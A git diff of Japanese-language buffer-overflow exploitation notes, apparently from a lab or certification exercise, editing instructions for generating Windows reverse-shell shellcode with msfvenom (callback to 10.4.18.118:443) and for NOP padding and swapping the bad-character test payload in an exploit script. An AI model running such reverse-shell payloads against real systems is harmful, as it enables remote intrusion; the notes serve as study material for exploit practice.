@@ -90,10 +90,10 @@ $ msfvenom -p windows/shell_reverse_tcp LHOST=10.4.18.118 LPORT=443 EXITFUNC=thr
 
 エンコードなし
 ```
-$ msfvenom -p windows/shell_reverse_tcp LHOST=10.4.18.118 LPORT=443 EXITFUNC=thread -f c -b "\x00\x04\x3e\x3f\xe1"
+$ msfvenom -p windows/shell_reverse_tcp LHOST=10.4.18.118 LPORT=443 EXITFUNC=thread -f c
 ```
 
-基本的にエンコードありで作成するが、おそらく除外する文字列のせいで作成できない場合があるので、そういうときだけエンコードなしにする。<br>
+基本的にエンコードありで作成する。<br>
 エンコードありにする場合、paddingとしてNOP命令(=\x90)をpayloadの前に入れないとうまく実行されない場合があるので、exploitコードのpaddingのコメントアウトを入れ替える。
 
 Badchar特定のために使ったpayloadを消して、作成したシェルコードをpayloadに追記する。
